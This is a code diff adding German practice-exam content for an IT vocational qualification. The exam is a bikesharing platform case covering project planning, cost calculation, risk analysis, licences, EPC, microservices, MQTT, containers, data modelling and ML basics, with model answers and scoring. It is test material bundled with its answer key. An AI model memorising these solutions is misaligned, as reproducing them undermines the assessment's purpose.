+        mc: {o: ['Server virtualisieren und schwach ausgelastete physische Server abschalten', 'Bildschirmschoner mit Animation aktivieren', 'Abwärme des Serverraums zum Heizen der Büros nutzen und die Kühlung auf höhere Zulufttemperaturen einstellen', 'Alle PCs nachts eingeschaltet lassen, damit Updates schneller laufen', 'E-Mails zur Archivierung ausdrucken'], c: [0, 2]},
+        a: ['**Virtualisierung und Konsolidierung** erhöhen die Auslastung und sparen Hardware, Strom und Kühlung. **Abwärmenutzung** und effiziente Kühlung verbessern die Energieeffizienz (PUE). Bildschirmschoner sparen keinen Strom (Standby oder Ausschalten schon), Dauerbetrieb und Ausdrucke verbrauchen zusätzlich Ressourcen.'], see: ['wiso-nachhaltigkeit']},
+      {pts: 3, topic: 'Zielbeziehungen', q: 'Elbcode will die **Kosten senken** und zugleich den **Stromverbrauch** reduzieren, indem es alte Server durch effizientere ersetzt. Welche Zielbeziehung liegt vor?',
+        mc: {o: ['Zielkonflikt', 'Zielharmonie (Zielkomplementarität)', 'Zielindifferenz (Zielneutralität)', 'Zielidentität im Sinne des Maximalprinzips'], c: [1]},
+        a: ['**Zielharmonie**: Die Erreichung des einen Ziels fördert das andere (weniger Strom = geringere Kosten). **Zielkonflikt**: Ein Ziel behindert das andere (zum Beispiel kurzfristige Gewinnmaximierung gegen teuren Umweltschutz). **Zielindifferenz**: Die Ziele beeinflussen sich nicht.'], see: ['wiso-kennzahlen', 'wiso-nachhaltigkeit']},
+    ],
+  });
+  AP2.exam.end(ID);
+})();
+;
+// content/exam/ps5-1.js
+// Probeprüfung 5, Planen eines Softwareproduktes: VeloCity Leipzig GmbH, Bikesharing-Plattform (hybrides Vorgehen, Architektur, IoT, KI, Sicherheit).
+(function () {
+  const ID = 'exam5-ps';
+  const G = (rows, cap) => ['diagram', AP2.dg.gantt(rows, {total: 16, unit: 34, left: 210, tickLabel: (t) => 'W' + t, tick: 1, labels: true, cap})];
+  AP2.page(ID, {b: 'exam', g: 'Probeprüfung 5 (Mobilität)', t: 'Planen eines Softwareproduktes: Bikesharing VeloCity', blocks: []});
+  AP2.exam.start(ID, {minutes: 90, cover: AP2.exam.COVER.ps,
+    hint: 'Schwerpunkte: hybrides Vorgehen, Ressourcenplanung im Gantt-Diagramm, Kalkulation, Risikoanalyse, Lizenzen, EPK, Microservices, MQTT, Cloud und Container, KI, Kontrollflussgraph, Git und CI/CD, Routing, Angriffserkennung in Logdateien, Signaturen.',
+    intro: [
+      ['p', 'Sie arbeiten bei der **Saxon Apps GmbH** in Dresden. Die **VeloCity Leipzig GmbH** betreibt ein Bikesharing-System mit **1.800 Rädern** (davon 700 E-Bikes) an **260 Stationen**. Die Räder haben ein **smartes Schloss** mit GPS und LTE-Modem, das Statusmeldungen sendet und Befehle empfängt.'],
+      ['p', 'Ihr Auftrag ist die neue Plattform **VeloCity 2.0**: App zum Ausleihen per QR-Code, Abrechnung, Flottenmanagement für die Servicetechniker und eine **KI-gestützte Bedarfsprognose**, damit leere Stationen rechtzeitig wieder befüllt werden. Die Schlösser liefert ein externer Hersteller mit fester Schnittstelle.'],
+      ['kv', [['Kunde', 'VeloCity Leipzig GmbH (kommunale Beteiligung), 60 Beschäftigte'], ['Auftragnehmer', 'Saxon Apps GmbH, Team: Anna (App, Schloss), Ben (Backend), weitere nach Bedarf'], ['Rahmen', 'Festpreisangebot, Start der Saison am 1. April'], ['Technik', 'Cloud-Hosting in der EU, MQTT für die Schlösser, REST für die Apps']]],
+    ]});
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 1: Projekt planen und kalkulieren (25 Punkte)',
+    tasks: [
+      {pts: 5, topic: 'Vorgehensmodell', q: 'Die Schloss-Schnittstelle ist vom Hersteller fest vorgegeben, die Anforderungen an die App ändern sich dagegen laufend. Schlagen Sie ein passendes Vorgehen vor und begründen Sie es. Grenzen Sie dabei Wasserfallmodell, Scrum und Kanban voneinander ab.',
+        a: ['Empfehlung: **hybrides Vorgehen**. Hardwareintegration, Verträge und Meilensteine (Saisonstart, Abnahme) **plangetrieben** (Wasserfall/Phasen mit Meilensteinen), die App-Entwicklung **agil mit Scrum** (kurze Sprints, Feedback der Nutzer). Betrieb und Fehlerbehebung nach dem Go-live mit **Kanban** (kontinuierlicher Fluss, WIP-Limits).', '- **Wasserfall:** sequentielle Phasen, vollständige Anforderungen zu Beginn, Änderungen teuer; gut bei stabilen Anforderungen.', '- **Scrum:** feste Sprints, Rollen (Product Owner, Scrum Master, Entwickler), Inkrement je Sprint; gut bei unsicheren Anforderungen.', '- **Kanban:** keine Sprints und festen Rollen, Visualisierung auf dem Board, **Begrenzung der parallelen Arbeit (WIP-Limit)**, Pull-Prinzip; gut für Support und Wartung.'],
+        see: ['ps-vorgehen', 'ps-scrum']},
+      {pts: 8, rows: 8, topic: 'Gantt und Ressourcen', q: 'Vorgänge (Dauer in Wochen): **A** Anforderungen 3 (alle), **B** App-Entwicklung 6 (Anna, nach A), **C** Schloss-Schnittstelle 4 (Anna, nach A), **D** Backend 5 (Ben, nach A), **E** Test und Abnahme 2 (nach B, C und D). a) Erstellen Sie ein Gantt-Diagramm ohne Berücksichtigung der Ressourcen und geben Sie die Projektdauer an. b) Erkennen Sie den Ressourcenkonflikt, lösen Sie ihn durch Verschieben und geben Sie die neue Dauer an. c) Schlagen Sie eine bessere Lösung vor.',
+        a: ['a) A W0 bis W3; B W3 bis W9, C W3 bis W7, D W3 bis W8; E nach dem spätesten Vorgänger (B) W9 bis W11: **11 Wochen**.', 'b) **Konflikt:** Anna müsste B und C in W3 bis W7 **gleichzeitig** bearbeiten. Nacheinander (zum Beispiel C zuerst, weil die Hardware-Schnittstelle das größere Risiko ist): C W3 bis W7, B W7 bis W13, E W13 bis W15: **15 Wochen** (+4).', 'c) Ben ist nach D ab W8 frei: **Ben übernimmt C** (W8 bis W12), Anna B (W3 bis W9), E W12 bis W14: **14 Wochen**. Noch besser: C an eine **zusätzliche Person** (oder Werkstudent/Hersteller-Support) vergeben, dann 11 Wochen. Weitere Ideen: Teile von B auf Ben verlagern, Umfang von B reduzieren (MVP).', 'Bewertung: a) 3 P, b) 3 P, c) 2 P.'],
+        sol: [['walk', {t: 'Ressourcenkonflikt im Gantt-Diagramm', steps: [
+          {t: '**Ohne Ressourcen:** B, C und D starten gleichzeitig nach A. E wartet auf den längsten Vorgänger B. Dauer **11 Wochen**.', b: [G([['A Anforderungen', 0, 3, 'plain'], ['B App (Anna)', 3, 6], ['C Schloss (Anna)', 3, 4, 'bad'], ['D Backend (Ben)', 3, 5, 'ok'], ['E Test', 9, 2, 'gold'], ['Ende', 11, 0]], 'Rot markiert: Anna ist in W3 bis W7 doppelt verplant')]},
+          {t: '**Konflikt lösen durch Verschieben:** Anna macht erst C, dann B. B endet in W13, E in W15: **15 Wochen**.', b: [G([['A Anforderungen', 0, 3, 'plain'], ['C Schloss (Anna)', 3, 4], ['B App (Anna)', 7, 6], ['D Backend (Ben)', 3, 5, 'ok'], ['E Test', 13, 2, 'gold'], ['Ende', 15, 0]], 'Kapazitätstreu, aber 4 Wochen länger')]},
+          {t: '**Bessere Verteilung:** Ben übernimmt C nach dem Backend. Anna arbeitet ohne Unterbrechung an B. Dauer **14 Wochen**; mit einer zusätzlichen Person für C wieder 11 Wochen.', b: [G([['A Anforderungen', 0, 3, 'plain'], ['B App (Anna)', 3, 6], ['D Backend (Ben)', 3, 5, 'ok'], ['C Schloss (Ben)', 8, 4, 'ok'], ['E Test', 12, 2, 'gold'], ['Ende', 14, 0]], 'Ressourcen ausgeglichen')]},
+        ]}]],
+        see: ['ps-gantt', 'ps-netzplan']},
+      {pts: 4, topic: 'Angebotskalkulation', q: 'Für die Plattform werden **1.200 Personenstunden** zu einem Stundensatz von **62 Euro** (Personaleinzelkosten) geschätzt. Der Gemeinkostenzuschlag beträgt **40 %**, der Gewinnzuschlag **15 %**. Berechnen Sie den **Nettoangebotspreis** in Euro.',
+        num: {c: 119784, tol: 1, unit: 'Euro'},
+        a: [['table', ['Position', 'Rechnung', 'Euro'], [['Personaleinzelkosten', '1.200 h x 62 Euro', '74.400,00'], ['+ Gemeinkosten 40 %', '74.400 x 0,40', '29.760,00'], ['= Selbstkosten', '', '104.160,00'], ['+ Gewinn 15 %', '104.160 x 0,15', '15.624,00'], ['= **Nettoangebotspreis**', '', '**119.784,00**'], ['+ Umsatzsteuer 19 %', '', '22.758,96'], ['= Bruttoangebotspreis', '', '142.542,96']]]],
+        see: ['ps-kalkulation', 'ps-angebot']},
+      {pts: 4, rows: 6, topic: 'Risikoanalyse', q: 'Bewerten Sie die Risiken mit dem **erwarteten Schaden** (Eintrittswahrscheinlichkeit x Schadenshöhe), bringen Sie sie in eine Rangfolge und nennen Sie für das größte Risiko eine vorbeugende Maßnahme. Warum sollte Risiko R3 trotz seines Rangs besonders beachtet werden?',
+        ctx: [['table', ['Nr.', 'Risiko', 'Wahrscheinlichkeit', 'Schaden'], [['R1', 'Lieferverzug der Schlösser', '40 %', '50.000 Euro'], ['R2', 'Ausfall der Schlüsselentwicklerin', '10 %', '80.000 Euro'], ['R3', 'Datenschutzverstoß mit Standortdaten', '5 %', '300.000 Euro'], ['R4', 'Geringe Akzeptanz der neuen App', '30 %', '40.000 Euro']]]],
+        a: [['table', ['Rang', 'Risiko', 'erwarteter Schaden'], [['1', 'R1 Lieferverzug', '0,40 x 50.000 = **20.000 Euro**'], ['2', 'R3 Datenschutz', '0,05 x 300.000 = **15.000 Euro**'], ['3', 'R4 Akzeptanz', '0,30 x 40.000 = **12.000 Euro**'], ['4', 'R2 Personalausfall', '0,10 x 80.000 = **8.000 Euro**']]],
+          'Maßnahme R1: Liefertermin mit **Vertragsstrafe** absichern, frühe Teillieferung von Musterschlössern, **Simulator/Mock** der Schnittstelle, damit die Entwicklung nicht wartet, zweiten Lieferanten prüfen.', 'R3: Der Erwartungswert verdeckt die **sehr hohe Schadenshöhe** (Bußgelder bis 4 % des Jahresumsatzes, Imageschaden). Solche Risiken mit kleiner Wahrscheinlichkeit und großem Schaden werden in der Risikomatrix gesondert betrachtet: **Datenschutz durch Technikgestaltung**, Pseudonymisierung, kurze Löschfristen, DSFA.'],
+        sol: [['diagram', {w: 700, h: 300, cap: 'Risikomatrix: R3 liegt trotz geringer Wahrscheinlichkeit im kritischen Bereich (hoher Schaden)', nodes: [
+          {id: 'y', k: 'text', x: 60, y: 150, t: 'Wahrscheinlichkeit', w: 10, h: 10, mw: 110},
+          {id: 'c1', k: 'box', x: 220, y: 60, w: 150, h: 70, t: '', s: 'gold'}, {id: 'c2', k: 'box', x: 380, y: 60, w: 150, h: 70, t: 'R1', s: 'bad'}, {id: 'c3', k: 'box', x: 540, y: 60, w: 150, h: 70, t: '', s: 'bad'},
+          {id: 'c4', k: 'box', x: 220, y: 140, w: 150, h: 70, t: 'R4', s: 'ok'}, {id: 'c5', k: 'box', x: 380, y: 140, w: 150, h: 70, t: 'R2', s: 'gold'}, {id: 'c6', k: 'box', x: 540, y: 140, w: 150, h: 70, t: '', s: 'bad'},
+          {id: 'c7', k: 'box', x: 220, y: 220, w: 150, h: 70, t: '', s: 'ok'}, {id: 'c8', k: 'box', x: 380, y: 220, w: 150, h: 70, t: '', s: 'ok'}, {id: 'c9', k: 'box', x: 540, y: 220, w: 150, h: 70, t: 'R3', s: 'gold'},
+          {id: 'x', k: 'text', x: 380, y: 282, t: 'Schadenshöhe: gering - mittel - hoch', w: 10, h: 10, mw: 400},
+        ], edges: []}]],
+        see: ['ps-stakeholder']},
+      {pts: 4, topic: 'Lizenzen', q: 'Die Plattform soll folgende Komponenten nutzen: a) Kartendaten von **OpenStreetMap** (ODbL), b) eine JSON-Bibliothek unter **MIT-Lizenz**, c) eine Routing-Engine unter **AGPL-3.0** im Backend, das als Webdienst betrieben wird. Welche Pflichten ergeben sich jeweils?',
+        a: ['a) **ODbL**: Namensnennung ("© OpenStreetMap-Mitwirkende") in der App; veränderte und veröffentlichte **Datenbanken** müssen unter derselben Lizenz stehen (Share-Alike), die eigene App selbst nicht.', 'b) **MIT** (permissiv): Lizenztext und Copyright-Hinweis beilegen; eigener Code darf proprietär bleiben.', 'c) **AGPL**: starkes Copyleft, das auch bei Nutzung **über das Netzwerk** greift. Wird die Engine verändert und als Dienst angeboten, muss der **Quellcode der veränderten Fassung** den Nutzern zugänglich gemacht werden. Lösung: unverändert und als getrennter Dienst betreiben oder eine kommerzielle Lizenz erwerben. (Bei der GPL greift die Pflicht nur bei Weitergabe der Software.)'],
+        see: ['ps-lizenzen']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 2: Prozesse und Architektur (25 Punkte)',
+    tasks: [
+      {pts: 7, rows: 9, topic: 'EPK', q: 'Modellieren Sie die Ausleihe als **ereignisgesteuerte Prozesskette (EPK)**: Ein Kunde will ein Rad ausleihen und scannt in der App den QR-Code. Ist das Rad identifiziert, wird das Kundenkonto (Kundendatenbank) geprüft. Ist das Konto gültig, wird das Schloss geöffnet und die Ausleihe ist gestartet. Ist es gesperrt, erscheint ein Hinweis und die Ausleihe ist abgelehnt.',
+        a: ['Regeln: Die EPK beginnt und endet mit **Ereignissen** (Sechsecke); Ereignisse und **Funktionen** (abgerundete Rechtecke) wechseln sich ab; nach einer Funktion, die entscheidet, folgt ein **XOR-Verknüpfungsoperator** (exklusives Oder), weil Ereignisse nicht entscheiden können. Informationsobjekte (Kundendatenbank) und Organisationseinheiten (App/Kunde) werden in der erweiterten EPK angehängt.', 'Bewertung: Ereignisse und Funktionen im Wechsel (3 P), XOR nach der Funktion (2 P), Start- und Endereignisse (1 P), Informationsobjekt (1 P).'],
+        sol: [['diagram', {w: 760, h: 600, keep: 600, cap: 'Musterlösung: erweiterte EPK der Ausleihe (Sechseck = Ereignis, abgerundet = Funktion, Kreis = Verknüpfung)', nodes: [
+          {id: 'e1', k: 'hex', x: 380, y: 40, w: 230, h: 46, t: 'Kunde will Rad ausleihen', s: 'cat4'},
+          {id: 'f1', k: 'round', x: 380, y: 110, w: 210, h: 44, t: 'QR-Code scannen', s: 'ok'}, {id: 'o1', k: 'oval', x: 140, y: 110, w: 130, h: 44, t: 'Kunde (App)', s: 'gold'},
+          {id: 'e2', k: 'hex', x: 380, y: 180, w: 200, h: 46, t: 'Rad identifiziert', s: 'cat4'},
+          {id: 'f2', k: 'round', x: 380, y: 250, w: 210, h: 44, t: 'Kundenkonto prüfen', s: 'ok'}, {id: 'i1', k: 'cyl', x: 630, y: 250, w: 150, h: 56, t: 'Kundendatenbank', s: 'soft'},
+          {id: 'x', k: 'circle', x: 380, y: 320, w: 46, h: 46, t: 'XOR'},
+          {id: 'e3', k: 'hex', x: 220, y: 395, w: 180, h: 46, t: 'Konto gültig', s: 'cat4'}, {id: 'e4', k: 'hex', x: 540, y: 395, w: 180, h: 46, t: 'Konto gesperrt', s: 'cat4'},
+          {id: 'f3', k: 'round', x: 220, y: 465, w: 180, h: 44, t: 'Schloss öffnen', s: 'ok'}, {id: 'f4', k: 'round', x: 540, y: 465, w: 180, h: 44, t: 'Hinweis anzeigen', s: 'ok'},
+          {id: 'e5', k: 'hex', x: 220, y: 540, w: 190, h: 46, t: 'Ausleihe gestartet', s: 'cat4'}, {id: 'e6', k: 'hex', x: 540, y: 540, w: 190, h: 46, t: 'Ausleihe abgelehnt', s: 'cat4'},
+        ], edges: [{a: 'e1', b: 'f1'}, {a: 'f1', b: 'e2'}, {a: 'e2', b: 'f2'}, {a: 'f2', b: 'x'}, {a: 'x', b: 'e3'}, {a: 'x', b: 'e4'}, {a: 'e3', b: 'f3'}, {a: 'e4', b: 'f4'}, {a: 'f3', b: 'e5'}, {a: 'f4', b: 'e6'},
+          {a: 'o1', b: 'f1', ea: 'none'}, {a: 'i1', b: 'f2', k: 'dash'}]}],
+          ['warn', 'Klassischer Fehler: Verzweigung direkt nach einem **Ereignis** mit XOR oder ODER. Ereignisse sind passiv und können nicht entscheiden; vor einer Verzweigung muss eine **Funktion** stehen.']],
+        see: ['ps-epk']},
+      {pts: 6, rows: 8, topic: 'Microservices', q: 'Das alte System ist ein **Monolith**. Für VeloCity 2.0 wird eine **Microservice-Architektur** erwogen. a) Nennen Sie je zwei Vor- und Nachteile. b) Schlagen Sie vier fachlich geschnittene Services vor und skizzieren Sie die Architektur mit API-Gateway und Nachrichtenbroker für die Schlösser.',
+        a: ['a) Vorteile: Services **unabhängig entwickel-, deploy- und skalierbar** (Ausleihe im Sommer stark skalieren), Fehler bleiben isoliert, Technologiefreiheit je Team. Nachteile: **höhere Komplexität** im Betrieb (Monitoring, Netzwerk, verteilte Fehler), Datenkonsistenz über Services hinweg schwierig (keine gemeinsame Transaktion), mehr Infrastruktur (Container, Orchestrierung).', 'b) Services zum Beispiel: **Nutzerverwaltung**, **Ausleihe**, **Abrechnung**, **Flottenmanagement** (Schlösser, Akkus, Wartung), optional **Prognose** (KI). Jeder Service mit **eigener Datenbank**. Die Apps sprechen nur mit dem **API-Gateway** (Authentifizierung, Routing, Rate Limiting). Die Schlösser kommunizieren über einen **MQTT-Broker** mit dem Flottenservice; Services tauschen Ereignisse (zum Beispiel "Ausleihe beendet") asynchron aus.'],
+        sol: [['diagram', {w: 880, h: 420, keep: 720, cap: 'Microservice-Architektur VeloCity 2.0: Gateway für die Apps, Broker für die Schlösser, je Service eine eigene Datenbank', nodes: [
+          {id: 'app', k: 'box', x: 90, y: 80, w: 130, h: 44, t: 'Kunden-App'}, {id: 'tech', k: 'box', x: 90, y: 160, w: 130, h: 44, t: 'Techniker-App'},
+          {id: 'gw', k: 'box', x: 270, y: 120, w: 130, h: 60, t: ['API-Gateway', 'Auth, Routing'], s: 'accent'},
+          {id: 's1', k: 'box', x: 470, y: 50, w: 150, h: 44, t: 'Nutzer-Service', s: 'ok'}, {id: 's2', k: 'box', x: 470, y: 120, w: 150, h: 44, t: 'Ausleih-Service', s: 'ok'},
+          {id: 's3', k: 'box', x: 470, y: 190, w: 150, h: 44, t: 'Abrechnungs-Service', s: 'ok'}, {id: 's4', k: 'box', x: 470, y: 300, w: 150, h: 44, t: 'Flotten-Service', s: 'ok'},
+          {id: 'd1', k: 'cyl', x: 660, y: 50, w: 90, h: 44, t: 'DB'}, {id: 'd2', k: 'cyl', x: 660, y: 120, w: 90, h: 44, t: 'DB'}, {id: 'd3', k: 'cyl', x: 660, y: 190, w: 90, h: 44, t: 'DB'}, {id: 'd4', k: 'cyl', x: 660, y: 300, w: 90, h: 44, t: 'DB'},
+          {id: 'mq', k: 'box', x: 270, y: 330, w: 130, h: 56, t: ['MQTT-Broker', 'TLS 8883'], s: 'gold'}, {id: 'lk', k: 'box', x: 90, y: 330, w: 130, h: 56, t: ['1.800 Schlösser', 'LTE'], s: 'soft'},
+          {id: 'bus', k: 'box', x: 800, y: 190, w: 110, h: 60, t: ['Event-Bus', '(Ereignisse)'], s: 'soft'},
+        ], edges: [{a: 'app', b: 'gw'}, {a: 'tech', b: 'gw'}, {a: 'gw', b: 's1'}, {a: 'gw', b: 's2'}, {a: 'gw', b: 's3'}, {a: 'gw', b: 's4', via: [[340, 260], [470, 260]]},
+          {a: 's1', b: 'd1', ea: 'none'}, {a: 's2', b: 'd2', ea: 'none'}, {a: 's3', b: 'd3', ea: 'none'}, {a: 's4', b: 'd4', ea: 'none'},
+          {a: 'lk', b: 'mq', sa: 'arrow'}, {a: 'mq', b: 's4', sa: 'arrow'}, {a: 's3', b: 'bus', k: 'dash', via: [[470, 240], [800, 240]]}, {a: 's2', b: 'bus', k: 'dash', via: [[560, 92], [800, 92]]}]}]],
+        see: ['ps-architektur']},
+      {pts: 6, rows: 8, topic: 'MQTT', q: 'Die Schlösser sind per **MQTT** angebunden. a) Erklären Sie das Publish-Subscribe-Prinzip mit Broker. b) Entwerfen Sie eine Topic-Struktur für Statusmeldungen und Befehle und geben Sie ein Abonnement mit Platzhalter für alle Statusmeldungen einer Station an. c) Wählen Sie begründet den QoS-Level für "Schloss öffnen" und für die GPS-Position. d) Wie erkennt der Broker ein Schloss, das plötzlich die Verbindung verliert?',
+        a: ['a) Clients senden Nachrichten an ein **Topic** beim **Broker** (Publish); der Broker verteilt sie an alle Clients, die das Topic **abonniert** haben (Subscribe). Sender und Empfänger kennen sich nicht (Entkopplung), die Schlösser bauen nur eine ausgehende Verbindung auf (gut für LTE und Firewalls).', 'b) Zum Beispiel **velocity/station/{stationId}/rad/{radId}/status** und **velocity/rad/{radId}/befehl**. Alle Statusmeldungen von Station 17: **velocity/station/17/rad/+/status** (+ = eine Ebene, # = alle folgenden Ebenen, etwa velocity/station/17/#).', 'c) **Schloss öffnen: QoS 1** (mindestens einmal; Öffnen ist idempotent, ein Duplikat schadet nicht) oder QoS 2 (genau einmal, mehr Overhead). **GPS-Position: QoS 0** (höchstens einmal), weil laufend neue Werte kommen und ein verlorener Wert unkritisch ist; spart Datenvolumen und Akku.', 'd) Über **Last Will and Testament (LWT)**: Das Schloss hinterlegt beim Verbinden eine Nachricht (zum Beispiel "offline", **retained**), die der Broker veröffentlicht, wenn die Verbindung ohne ordnungsgemäßes Trennen abbricht (Keep-Alive-Zeit überschritten).', 'Sicherheit: TLS (Port 8883), Client-Zertifikate je Schloss, Zugriffsrechte (ACL) je Topic.'],
+        sol: [['seq', {w: 760, actors: ['Schloss Rad 4711', 'MQTT-Broker', 'Flotten-Service', 'Techniker-App'], cap: 'Publish-Subscribe: Der Broker verteilt Nachrichten an alle Abonnenten; bei Verbindungsabbruch veröffentlicht er den Last Will.', steps: [
+          [2, 1, 'SUBSCRIBE velocity/station/+/rad/+/status', 's'], [3, 1, 'SUBSCRIBE velocity/station/17/#', 's'], [0, 1, 'CONNECT (LWT: offline, retained)', 's'],
+          [0, 1, 'PUBLISH .../17/rad/4711/status: frei, Akku 64 %', 's'], [1, 2, 'Weiterleitung', 'a'], [1, 3, 'Weiterleitung', 'a'],
+          [2, 1, 'PUBLISH velocity/rad/4711/befehl: öffnen (QoS 1)', 's'], [1, 0, 'Weiterleitung', 'a'], [0, 1, 'PUBACK', 'r'], ['sep', 'LTE-Verbindung bricht ab, Keep-Alive läuft ab'], [1, 2, 'Last Will: offline', 'a']]}]],
+        see: ['infra-mqtt', 'eua-iot']},
+      {pts: 6, topic: 'Cloud und Container', q: 'a) Ordnen Sie zu, wofür VeloCity bei **IaaS**, **PaaS** und **SaaS** jeweils selbst verantwortlich ist. b) Das Backend soll in **Containern** statt in virtuellen Maschinen laufen. Erläutern Sie den Unterschied und zwei Vorteile.',
+        a: [['table', ['Schicht', 'IaaS', 'PaaS', 'SaaS'], [['Anwendung und Daten', '**Kunde**', '**Kunde**', 'Anbieter (Daten: Kunde verantwortlich)'], ['Laufzeitumgebung, Middleware', '**Kunde**', 'Anbieter', 'Anbieter'], ['Betriebssystem', '**Kunde**', 'Anbieter', 'Anbieter'], ['Virtualisierung, Server, Netz, Rechenzentrum', 'Anbieter', 'Anbieter', 'Anbieter'], ['Beispiel', 'virtuelle Server', 'verwaltete Datenbank, App-Plattform', 'Microsoft 365, Ticketsystem']]],
+          'b) Eine **VM** enthält ein **vollständiges Gastbetriebssystem** auf einem Hypervisor. **Container** teilen sich den **Kernel des Host-Betriebssystems** und enthalten nur Anwendung und Bibliotheken. Vorteile: **schneller Start** (Sekunden), **geringerer Ressourcenbedarf**, gleiches Image von der Entwicklung bis zur Produktion (keine "läuft nur bei mir"-Fehler), einfache Skalierung mit Orchestrierung (Kubernetes). Nachteil: schwächere Isolation als VMs.'],
+        sol: [['row', [['diagram', AP2.dg.layers([['App A | App B', 'Anwendungen', 'accent'], ['Gast-OS | Gast-OS', 'je VM ein Betriebssystem', 'gold'], ['Hypervisor', 'Typ 1 oder Typ 2', 'soft'], ['Hardware', 'Server', 'soft']], {w: 420, lw: 170, cap: 'Virtuelle Maschinen'})],
+          ['diagram', AP2.dg.layers([['App A | App B', 'Container mit Bibliotheken', 'accent'], ['Container-Runtime', 'zum Beispiel Docker, containerd', 'ok'], ['Host-Betriebssystem', 'ein gemeinsamer Kernel', 'gold'], ['Hardware', 'Server', 'soft']], {w: 420, lw: 170, cap: 'Container'})]]]],
+        see: ['infra-virtualisierung', 'ps-tco']},
+    ],
+  });
+  AP2.exam.part(ID, {
+    t: 'Handlungsschritt 3: Daten, KI und Softwarequalität (25 Punkte)',
+    tasks: [
+      {pts: 7, rows: 9, topic: 'ER- und Relationenmodell', q: 'Modellieren Sie: Ein **Kunde** leiht viele **Räder** aus; jede **Ausleihe** gehört zu einem Kunden und einem Rad und hat Startzeit, Endzeit und Preis. Eine Ausleihe beginnt an einer **Startstation** und endet an einer **Zielstation** (solange sie läuft, ist die Zielstation leer). Ein Rad steht an höchstens einer Station. a) Erstellen Sie das Relationenmodell mit Primär- und Fremdschlüsseln. b) Welche Besonderheit hat die Beziehung zwischen Ausleihe und Station?',
+        a: ['a) **kunde** (PK kunde_id, name, abo), **station** (PK station_id, name, stadtteil), **rad** (PK rad_id, typ, FK station_id **NULL erlaubt**), **ausleihe** (PK ausleihe_id, FK kunde_id, FK rad_id, **FK start_station**, **FK ziel_station NULL erlaubt**, start_zeit, ende_zeit, preis).', 'b) Zwischen ausleihe und station bestehen **zwei Beziehungen** mit unterschiedlichen **Rollen** (Start und Ziel). Deshalb zwei Fremdschlüssel, die beide auf station verweisen. Die Zielstation ist optional (0..1), solange die Ausleihe läuft. In Abfragen wird station dann zweimal mit verschiedenen Aliasen gejoint.', 'Bewertung: Tabellen und PK (2 P), FKs (3 P), Rollen und optionale FKs (2 P).'],
+        sol: [['diagram', {w: 860, h: 300, keep: 700, cap: 'Relationenmodell: zwei Rollen-Beziehungen zwischen ausleihe und station (start, ziel)', nodes: [
+          {id: 'k', k: 'cls', x: 110, y: 80, w: 180, t: {name: 'kunde', attrs: ['PK kunde_id', 'name', 'abo']}},
+          {id: 'a', k: 'cls', x: 400, y: 120, w: 220, s: 'accent', t: {name: 'ausleihe', attrs: ['PK ausleihe_id', 'FK kunde_id', 'FK rad_id', 'FK start_station', 'FK ziel_station (NULL)', 'start_zeit, ende_zeit', 'preis']}},
+          {id: 'r', k: 'cls', x: 110, y: 230, w: 180, t: {name: 'rad', attrs: ['PK rad_id', 'typ', 'FK station_id (NULL)']}},
+          {id: 's', k: 'cls', x: 720, y: 140, w: 190, t: {name: 'station', attrs: ['PK station_id', 'name', 'stadtteil']}},
+        ], edges: [{a: 'a', b: 'k', sa: 'many', ea: 'one'}, {a: 'a', b: 'r', sa: 'many', ea: 'one'}, {a: 'a', b: [625, 120], sa: 'many', ea: 'one', t: 'start', via: [[560, 120]]}, {a: 'a', b: [625, 165], sa: 'many', ea: 'zeroone', t: 'ziel', via: [[560, 165]]},
+          {a: 'r', b: 's', sa: 'many', ea: 'zeroone', via: [[110, 285], [720, 285]], t: 'steht an'}]}]],
+        see: ['ps-relational', 'ps-ermrm']},
+      {pts: 3, topic: 'Neuron', q: 'Die Bedarfsprognose nutzt ein neuronales Netz. Ein Neuron hat die Eingaben **x1 = 1** (Wochenende ja) und **x2 = 0,5** (Regenwahrscheinlichkeit), die Gewichte **w1 = 0,8** und **w2 = -0,4** sowie den Bias **b = 0,1**. Berechnen Sie die **Netzeingabe** (gewichtete Summe plus Bias).',
+        num: {c: 0.7, tol: 0.001},
+        a: ['net = x1 · w1 + x2 · w2 + b = 1 · 0,8 + 0,5 · (-0,4) + 0,1 = 0,8 - 0,2 + 0,1 = **0,7**.', 'Mit einer **Schwellenwertfunktion** (Ausgabe 1, wenn net ≥ 0) gibt das Neuron **1** aus. Beim Training werden die Gewichte so angepasst, dass der Fehler zwischen Vorhersage und tatsächlichem Wert sinkt (Backpropagation).'],
+        sol: [['tool', 'neuron']],
+        see: ['eua-knn', 'wiso-ki']},
+      {pts: 3, topic: 'Maschinelles Lernen', q: 'Für die Prognose liegen die Ausleihen der letzten drei Jahre mit Wetter und Wochentag vor. a) Welche Lernart liegt vor? b) Warum teilt man die Daten in Trainings- und Testdaten, und was bedeutet Überanpassung (Overfitting)?',
+        a: ['a) **Überwachtes Lernen** (Supervised Learning): Zu jedem Datensatz ist das Ergebnis (Zahl der Ausleihen) bekannt; es handelt sich um eine **Regression**. Unüberwachtes Lernen findet Muster ohne Zielwert (zum Beispiel Clustering von Stationen).', 'b) Das Modell wird mit den Trainingsdaten gelernt und mit **ungesehenen Testdaten** bewertet, um die **Verallgemeinerung** zu prüfen. **Overfitting**: Das Modell lernt die Trainingsdaten (inklusive Zufallsrauschen) auswendig, ist dort sehr gut, versagt aber bei neuen Daten.'],
+        see: ['eua-knn', 'wiso-ki']},
+      {pts: 6, rows: 9, topic: 'Kontrollflussgraph', q: 'Zeichnen Sie den **Kontrollflussgraphen** der Methode, berechnen Sie die **zyklomatische Komplexität** nach McCabe und geben Sie eine minimale Menge von Testfällen für die **Zweigüberdeckung (C1)** an.',
+        ctx: [['code', 'java', `double durchschnittAkku(int[] akku) {
+    int summe = 0, anzahl = 0, i = 0;      // 1
+    while (i < akku.length) {              // 2
+        if (akku[i] >= 0) {                // 3
+            summe += akku[i];              // 4
+            anzahl++;
+        }
+        i++;                               // 5
+    }
+    if (anzahl == 0) return 0;             // 6  -> 7
+    return (double) summe / anzahl;        // 8
+}`]],
